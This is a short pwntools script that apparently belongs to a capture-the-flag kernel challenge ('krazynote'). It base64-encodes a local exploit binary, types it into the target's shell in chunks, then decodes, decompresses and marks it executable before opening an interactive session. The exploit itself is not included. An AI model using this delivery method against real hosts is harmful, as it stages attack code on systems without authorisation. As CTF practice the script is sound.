#!/usr/bin/env python3
import base64
import os
import time
from pwn import *
os.system('xz -9 <exploit | base64 >exploit.xz.b64')
b64exploit = open(os.path.join(os.path.dirname(__file__), 'exploit.xz.b64'), 'rb').read()
os.chdir(os.path.join(os.path.dirname(__file__), 'release'))
t = process(argv=['./run.sh'])
#t = ssh('knote', 'krazynote.balsnctf.com', 54321, 'knote')
prompt = '~ $'
if False:
    t = process(argv=['./run-as-root.sh'])
    prompt = '/ #'
    t.readuntil(prompt)
    t.sendline('mount -t proc proc /proc')
    t.readuntil(prompt)
    t.sendline('insmod /home/note/note.ko')
    t.readuntil(prompt)
    t.sendline('mknod /dev/note c 10 11')

t.readuntil(prompt)
t.sendline('cat >exploit.xz.b64')
i = 0
while i < len(b64exploit):
    chunk = min(76, len(b64exploit) - i)
    t.sendline(b64exploit[i:i + chunk])
    i += chunk
t.send(b'\x04\n')
t.readuntil(prompt)
t.sendline('base64 -d <exploit.xz.b64 >exploit.xz')
t.readuntil(prompt)
t.sendline('xz -d exploit.xz')
t.readuntil(prompt)
t.sendline('chmod a+x exploit')
t.interactive()
